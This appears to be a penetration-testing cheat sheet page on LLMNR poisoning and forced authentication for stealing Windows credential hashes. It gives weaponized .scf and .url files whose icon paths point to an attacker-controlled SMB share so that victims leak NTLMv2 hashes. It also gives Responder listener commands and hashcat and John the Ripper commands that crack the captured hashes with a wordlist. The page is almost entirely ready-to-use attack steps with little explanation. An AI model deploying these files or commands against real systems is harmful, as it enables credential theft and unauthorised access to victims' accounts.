---
description: Credential Access, Stealing hashes
---

# LLMNR Poisoning/Forced Authentication

{% embed url="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication" %}

## Execution via .SCF

Place the below `.scf` file on the attacker controlled machine in a shared folder

{% code title="pwn.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\192.168.123.123\home\kali\pwn.scf
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

## Execution via .URL

Create a weaponized .url file and upload it to the victim system:

```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.123.123\%USERNAME%.icon
IconIndex=1
```

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

## Cracking NTLMv2

```
hashcat -m5600 'pasted hash' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt
```

## Example

{% embed url="https://app.gitbook.com/s/HoGMzBibTp9gPhwwxw1x/other-services-enumeration/445-smb" %}
